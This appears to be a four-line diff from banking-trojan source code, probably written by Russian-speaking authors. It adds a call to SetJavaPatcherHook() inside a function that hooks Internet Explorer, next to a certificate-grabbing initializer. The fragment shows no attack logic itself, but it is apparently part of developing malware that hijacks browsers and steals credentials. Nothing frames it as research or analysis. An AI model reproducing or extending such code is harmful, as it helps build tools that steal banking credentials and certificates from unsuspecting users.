@@ -1444,6 +1444,10 @@ bool HookInternetExplorer() {
 	CertGrabber::Initialize();
 #endif
 
+#ifdef JAVS_PATCHERH
+	SetJavaPatcherHook();
+#endif
+
 	IEDBG("Интернет эксплорер проинициализирован");
 	return true;
 }
